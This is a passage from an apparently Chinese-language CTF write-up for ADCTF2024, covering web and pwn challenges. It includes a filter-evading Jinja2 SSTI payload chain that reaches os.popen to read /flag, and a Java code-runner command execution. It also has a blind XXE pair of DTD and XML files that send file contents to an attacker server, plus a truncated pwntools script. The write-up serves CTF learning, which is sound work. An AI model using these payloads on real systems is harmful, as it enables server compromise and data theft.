(i.e. EOF) to exit<span class="punctuation">,</span></span><br><span class="line">        &#x27;exit&#x27;<span class="punctuation">:</span> Use exit() or Ctrl-D (i.e. EOF) to exit<span class="punctuation">,</span></span><br><span class="line">        &#x27;copyright&#x27;<span class="punctuation">:</span> Copyright (c) <span class="number">2001</span><span class="number">-2023</span> Python Software Foundation. All Rights Reserved.</span><br><span class="line">        Copyright (c) <span class="number">2000</span> BeOpen.com. All Rights Reserved.</span><br><span class="line">        Copyright (c) <span class="number">1995</span><span class="number">-2001</span> Corporation for National Research Initiatives. All Rights Reserved.</span><br><span class="line">        Copyright (c) <span class="number">1991</span><span class="number">-1995</span> Stichting Mathematisch Centrum. All Rights Reserved.<span class="punctuation">,</span></span><br><span class="line">        &#x27;help&#x27;<span class="punctuation">:</span> Type help() for interactive help<span class="punctuation">,</span> or help(object) for help about object.</span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    &#x27;Flask&#x27;<span class="punctuation">:</span> &lt;class &#x27;flask.app.Flask&#x27;&gt;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>接着看到里面有<code>__builtins__</code>，有了这东西我就能用<code>__import__</code>所以一顿操作把这两个东西弄出来</p>
<div class="note warning flat"><p>下面的payload我在这里写的时候加了回车方便查看，但是实际上丢进去我的脚本跑的时候，我是没加的，每次构造获得的变量仅在这次注入有效，所以要连带着上面的payload一起写进去</p>
</div>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Payload&gt; &#123;% set pop=dict(po=a,p=b)|join %&#125;	&#123;# 构造pop #&#125;</span><br><span class="line">&#123;% set globals=dict(__globals=a,__=b)|join %&#125;	&#123;# 构造__globals__ #&#125;</span><br><span class="line">&#123;% set global_obj=url_for|attr(globals) %&#125;	&#123;# 获得__globals__对象 #&#125;</span><br><span class="line">&#123;% set builtins=dict(__builtins=a,__=b)|join %&#125;	&#123;# 构造__builtins__ #&#125;</span><br><span class="line">&#123;% set builtins_obj=dict(global_obj)|attr(pop)(builtins) %&#125;	&#123;# 获得__builtins__对象 #&#125;</span><br><span class="line">&#123;% set import=dict(__import=a,__=b)|join %&#125;	&#123;# 构造__import__ #&#125;</span><br><span class="line">&#123;% set import_obj=dict(builtins_obj)|attr(pop)(import) %&#125;	&#123;# 获得__import__对象 #&#125;</span><br><span class="line">&#123;% print import_obj %&#125;</span><br><span class="line"></span><br><span class="line">&lt;built-in function __import__&gt;</span><br></pre></td></tr></table></figure>



<p>接着直接来获取一下os</p>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Payload&gt; &#123;% set pop=dict(po=a,p=b)|join %&#125;	&#123;# 构造pop #&#125;</span><br><span class="line">&#123;% set globals=dict(__globals=a,__=b)|join %&#125;	&#123;# 构造__globals__ #&#125;</span><br><span class="line">&#123;% set global_obj=url_for|attr(globals) %&#125;	&#123;# 获得__globals__对象 #&#125;</span><br><span class="line">&#123;% set builtins=dict(__builtins=a,__=b)|join %&#125;	&#123;# 构造__builtins__ #&#125;</span><br><span class="line">&#123;% set builtins_obj=dict(global_obj)|attr(pop)(builtins) %&#125;	&#123;# 获得__builtins__对象 #&#125;</span><br><span class="line">&#123;% set import=dict(__import=a,__=b)|join %&#125;	&#123;# 构造__import__ #&#125;</span><br><span class="line">&#123;% set import_obj=dict(builtins_obj)|attr(pop)(import) %&#125;	&#123;# 获得__import__对象 #&#125;</span><br><span class="line">&#123;% set os=dict(o=a,s=b)|join %&#125;	&#123;# 构造os #&#125;</span><br><span class="line">&#123;&#123; import_obj(os) &#125;&#125;	&#123;# 尝试获取os #&#125;</span><br><span class="line"></span><br><span class="line">&lt;module &#x27;os&#x27; from &#x27;C:\\Environment\\Python38\\lib\\os.py&#x27;&gt;</span><br></pre></td></tr></table></figure>



<p>接着去拿<code>popen</code></p>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Payload&gt; &#123;% set pop=dict(po=a,p=b)|join %&#125;	&#123;# 构造pop #&#125;</span><br><span class="line">&#123;% set globals=dict(__globals=a,__=b)|join %&#125;	&#123;# 构造__globals__ #&#125;</span><br><span class="line">&#123;% set global_obj=url_for|attr(globals) %&#125;	&#123;# 获得__globals__对象 #&#125;</span><br><span class="line">&#123;% set builtins=dict(__builtins=a,__=b)|join %&#125;	&#123;# 构造__builtins__ #&#125;</span><br><span class="line">&#123;% set builtins_obj=dict(global_obj)|attr(pop)(builtins) %&#125;	&#123;# 获得__builtins__对象 #&#125;</span><br><span class="line">&#123;% set import=dict(__import=a,__=b)|join %&#125;	&#123;# 构造__import__ #&#125;</span><br><span class="line">&#123;% set import_obj=dict(builtins_obj)|attr(pop)(import) %&#125;	&#123;# 获得__import__对象 #&#125;</span><br><span class="line">&#123;% set os=dict(o=a,s=b)|join %&#125;	&#123;# 构造os #&#125;</span><br><span class="line">&#123;% set popen=dict(pop=a,en=b)|join %&#125;	&#123;# 构造popen #&#125;</span><br><span class="line">&#123;&#123; import_obj(os)|attr(popen) &#125;&#125;	&#123;# 尝试获取popen #&#125;</span><br><span class="line"></span><br><span class="line">&lt;function popen at 0x000001E6323D63A0&gt;</span><br></pre></td></tr></table></figure>



<p>发现成功了，先把它变成一个变量</p>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set popen_obj=import_obj(os)|attr(popen) %&#125;	&#123;# 将popen对象赋值给popen_obj #&#125;</span><br><span class="line">&#123;% print popen_obj %&#125;</span><br><span class="line"></span><br><span class="line">&lt;function popen at 0x000001E6323D63A0&gt;</span><br></pre></td></tr></table></figure>



<p>接着我发现我还需要空格，而在尝试的时候，我发现了这个东西</p>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload&gt; &#123;&#123;url_for|string|list&#125;&#125; </span><br><span class="line">[&#x27;&lt;&#x27;, &#x27;b&#x27;, &#x27;o&#x27;, &#x27;u&#x27;, &#x27;n&#x27;, &#x27;d&#x27;, &#x27; &#x27;, &#x27;m&#x27;, &#x27;e&#x27;, &#x27;t&#x27;, &#x27;h&#x27;, &#x27;o&#x27;, &#x27;d&#x27;, &#x27; &#x27;, &#x27;F&#x27;, &#x27;l&#x27;, &#x27;a&#x27;, &#x27;s&#x27;, &#x27;k&#x27;, &#x27;.&#x27;, &#x27;u&#x27;, &#x27;r&#x27;, &#x27;l&#x27;, &#x27;_&#x27;, &#x27;f&#x27;, &#x27;o&#x27;, &#x27;r&#x27;, &#x27; &#x27;, &#x27;o&#x27;, &#x27;f&#x27;, &#x27; &#x27;, &#x27;&lt;&#x27;, &#x27;F&#x27;, &#x27;l&#x27;, &#x27;a&#x27;, &#x27;s&#x27;, &#x27;k&#x27;, &#x27; &#x27;, &quot;&#x27;&quot;, &#x27;a&#x27;, &#x27;p&#x27;, &#x27;p&#x27;, &quot;&#x27;&quot;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;]</span><br></pre></td></tr></table></figure>



<p>诶，这里面的index&#x3D;6的位置不就是个空格嘛，拿出来用</p>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set space=(url_for|string|list)|attr(pop)(6) %&#125;	&#123;# 将空格赋值给space #&#125;</span><br></pre></td></tr></table></figure>



<p>然后我又发现了一个很尴尬的问题，我缺少<code>/</code>这个字符，行吧，再去弄个chr函数</p>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Payload &gt;&#123;% set chr=dict(ch=a,r=b)|join %&#125;	&#123;# 构造chr #&#125;</span><br><span class="line">&#123;% set chr_obj=dict(builtins_obj)|attr(pop)(chr) %&#125;	&#123;# 得到chr对象 #&#125;</span><br><span class="line">&#123;% set slash=chr_obj(47) %&#125;	&#123;# 将/赋值给slash&#125;</span><br></pre></td></tr></table></figure>



<p>接着构造我需要的cmd</p>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Payload &gt;&#123;% set cat=dict(ca=a,t=b)|join %&#125;	&#123;# 构造cat #&#125;</span><br><span class="line">&#123;% set slash=chr_obj(47) %&#125;	</span><br><span class="line">&#123;% set flag=dict(fl=a,ag=b)|join %&#125;	&#123;# 构造flag #&#125;</span><br><span class="line">&#123;% set cmd=cat~space~slash~flag %&#125;	&#123;# 构造cmd=cat /flag #&#125;</span><br></pre></td></tr></table></figure>



<p>在构造一个read来调用<code>popen.read()</code></p>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload &gt;&#123;% set read=dict(re=a,ad=b)|join %&#125;	&#123;# 构造read #&#125;</span><br></pre></td></tr></table></figure>



<p>最后就是读取</p>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Payload &gt;&#123;% print popen_obj(cmd)|attr(read)() %&#125;	&#123;# 调用os.popen(&quot;cat /flag&quot;).read() #&#125;</span><br><span class="line"></span><br><span class="line">flag&#123;b2d7616e-e74b-416d-9e94-218928d98b5e&#125;</span><br></pre></td></tr></table></figure>



<p>最后payload组合起来长这样</p>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Payload&gt; &#123;% set pop=dict(po=a,p=b)|join %&#125;	&#123;# 构造pop #&#125;</span><br><span class="line">&#123;% set globals=dict(__globals=a,__=b)|join %&#125;	&#123;# 构造__globals__ #&#125;</span><br><span class="line">&#123;% set global_obj=url_for|attr(globals) %&#125;	&#123;# 得到__globals__对象 #&#125;</span><br><span class="line">&#123;% set builtins=dict(__builtins=a,__=b)|join %&#125;	&#123;# 构造__builtins__ #&#125;</span><br><span class="line">&#123;% set builtins_obj=dict(global_obj)|attr(pop)(builtins) %&#125;	&#123;# 得到__builtins__对象 #&#125;</span><br><span class="line">&#123;% set import=dict(__import=a,__=b)|join %&#125;	&#123;# 构造__import__ #&#125;</span><br><span class="line">&#123;% set import_obj=dict(builtins_obj)|attr(pop)(import) %&#125;	&#123;# 得到__import__对象 #&#125;</span><br><span class="line">&#123;% set os=dict(o=a,s=b)|join %&#125;	&#123;# 构造os #&#125;</span><br><span class="line">&#123;% set popen=dict(pop=a,en=b)|join %&#125;	&#123;# 构造popen #&#125;</span><br><span class="line">&#123;% set popen_obj=import_obj(os)|attr(popen) %&#125;	&#123;# 得到popen函数 #&#125;</span><br><span class="line">&#123;% set space=(url_for|string|list)|attr(pop)(6) %&#125;	&#123;# 得到空格 #&#125;</span><br><span class="line">&#123;% set chr=dict(ch=a,r=b)|join %&#125;	&#123;# 构造chr #&#125;</span><br><span class="line">&#123;% set chr_obj=dict(builtins_obj)|attr(pop)(chr) %&#125;	&#123;# 得到chr函数 #&#125;</span><br><span class="line">&#123;% set cat=dict(ca=a,t=b)|join %&#125;	&#123;# 构造cat #&#125;</span><br><span class="line">&#123;% set slash=chr_obj(47) %&#125;	&#123;# 构造左斜杠/ #&#125;</span><br><span class="line">&#123;% set flag=dict(fl=a,ag=b)|join %&#125;	&#123;# 构造flag #&#125;</span><br><span class="line">&#123;% set cmd=cat~space~slash~flag %&#125;	&#123;# 得到命令为cat /flag #&#125;</span><br><span class="line">&#123;% set read=dict(re=a,ad=b)|join %&#125;	&#123;# 构造read #&#125;</span><br><span class="line">&#123;% print popen_obj(cmd)|attr(read)() %&#125;	&#123;# 读取文件并输出内容 #&#125;</span><br><span class="line"></span><br><span class="line">flag&#123;b2d7616e-e74b-416d-9e94-218928d98b5e&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Easy-onlineJava"><a href="#Easy-onlineJava" class="headerlink" title="[Easy] onlineJava"></a><strong>[Easy]</strong> onlineJava</h2><p>访问到是一个在线Java的代码运行器</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_7fhoNVIEA5.png"></p>
<p>先尝试从零开始写一个读取文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReadFile</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Files.readAllBytes(Paths.get(filePath)));</span><br><span class="line">            System.out.println(content);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果报错了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_1600rD6S0u.png"></p>
<p>看起来可控的只有main函数里面的东西，所以我们不能import，那就用最原始的方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    java.io.<span class="type">InputStreamReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(p.getInputStream());</span><br><span class="line">    java.io.<span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(reader);</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        System.out.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">    br.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接创建一个进程来读取就行了，然后就拿到flag了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_C4TX1Eu9JM.png"></p>
<h2 id="Easy-xxe"><a href="#Easy-xxe" class="headerlink" title="[Easy] xxe"></a><strong>[Easy]</strong> xxe</h2><p>首先XXE我就不知道是个啥，先Google一下</p>
<blockquote>
<p>XML external entity injection (also known as XXE)。奇怪，XML External Entity 为什么不叫XEE？</p>
<p>XML 外部实体注入（也称为 XXE）是一种 Web 安全漏洞，允许攻击者干扰应用程序对 XML 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。</p>
<p>在某些情况下，攻击者可以利用 XXE 漏洞联合执行服务器端请求伪造(SSRF) 攻击，从而提高 XXE 攻击等级以破坏底层服务器或其他后端基础设施。</p>
</blockquote>
<p>因为习惯性的以为容器不出网 结果痛失前三血（哭</p>
<p>先反编译一下，在<code>com.ad.controller.MainController</code>类里面找到后门路由</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ad.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.DefaultResourceLoader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.XMLReader;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.XMLReaderFactory;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/* loaded from: XXE-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/ad/controller/MainController.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/backdoor&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hack</span><span class="params">(<span class="meta">@RequestParam</span> String fname)</span> <span class="keyword">throws</span> IOException, SAXException &#123;</span><br><span class="line">        <span class="type">DefaultResourceLoader</span> <span class="variable">resourceLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultResourceLoader</span>();</span><br><span class="line">        <span class="type">byte</span>[] content = resourceLoader.getResource(fname).getContentAsByteArray();</span><br><span class="line">        <span class="keyword">if</span> (content != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">XMLReader</span> <span class="variable">reader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">            reader.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(content)));</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后门路由为<code>/backdoor</code>，采用GET方式获取<code>fname</code>参数，并渲染<code>fname</code>对应的xml</p>
<p>我个人理解起来就是有点像SSTI，模板可控，因为前期尝试过了各种XXE姿势，发现成功只返回<code>success</code>，所以判断为盲注，然后参考了这篇文章</p>
<blockquote>
<p><a href="https://cloud.tencent.com/developer/article/1937079">渗透测试|利用Blind XXE Getshell(Java网站)-腾讯云开发者社区-腾讯云</a></p>
<p>注：某抄袭、偷盗、付费下载网站有这篇，但是要钱 &#x3D;-&#x3D;</p>
</blockquote>
<p>这位师傅用XXE成功Getshell了，而我只需要读取<code>/flag</code>的内容，所以可以改一下拿来用</p>
<h3 id="try-dtd"><a href="#try-dtd" class="headerlink" title="try.dtd"></a>try.dtd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://公网服务器IP:某端口/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>

<h3 id="tmpass-xml"><a href="#tmpass-xml" class="headerlink" title="tmpass.xml"></a>tmpass.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://org.bili33.top/CTFTMP/try.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reg</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>11<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">tel</span>&gt;</span>22<span class="tag">&lt;/<span class="name">tel</span>&gt;</span><span class="tag">&lt;<span class="name">email</span>&gt;</span>33<span class="tag">&lt;/<span class="name">email</span>&gt;</span><span class="tag">&lt;/<span class="name">reg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的<code>https://org.bili33.top/CTFTMP/try.dtd</code>是我借了Github服务器丢的一个文件（已删库，勿访问），这样能被访问到，然后我只需要读取<code>/flag</code>文件，所以在上面把<code>file</code>改成<code>file:///flag</code>，然后在我的公网服务器开一个flask服务器，等待回传就好了，得到flag为<code>ADCTF&#123;WOW_Y0u_Kn0w_H0w_to_use_Blind_XXE&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/MobaXterm_ekb64E4Rvd.png"></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Easy-meow"><a href="#Easy-meow" class="headerlink" title="[Easy] meow"></a><strong>[Easy]</strong> meow</h2><p>这题给的二进制文件有中文，所以第一件事情是更改了IDA的编码方式</p>
<p>在顶上的<code>Options</code>，然后在弹窗选择<code>Strings</code>，更改<code>Default 8-bit</code>为<code>UTF-8</code>即可</p>
<p>在main函数里发现了<code>alarm</code>函数，我的直觉告诉我这是脚本题</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_S7hXzc7AKA.png"></p>
<p>题目的猫娘要求如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_Zd1CvPoCaH.png"></p>
<p>所以上脚本梭哈（计数是后面加的）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;120.76.118.202&quot;</span>, <span class="number">33026</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Type your passphrase:&quot;</span> , <span class="string">b&quot;f922900eb0c3c804cbdc896a71d95179&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;请回复&#x27;喵~&#x27;开始&quot;</span>, <span class="string">&quot;喵~&quot;</span>)</span><br><span class="line"></span><br><span class="line">MeowCount = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    line = io.recvuntil(<span class="string">b&quot;\n&quot;</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;题目：&quot;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># io.interactive()</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[-<span class="number">2</span>] <span class="keyword">in</span> [<span class="string">&quot;?&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;~&quot;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;回答：&quot;</span>, line[:-<span class="number">2</span>].replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;请输入:&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;喵&quot;</span> + line[-<span class="number">2</span>])</span><br><span class="line">            io.sendline(line[:-<span class="number">2</span>].replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;请输入:&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;喵&quot;</span> + line[-<span class="number">2</span>])</span><br><span class="line">            MeowCount += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;回答：&quot;</span>, line.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;请输入:&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;喵~&quot;</span>)</span><br><span class="line">            io.sendline(line.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;请输入:&quot;</span>, <span 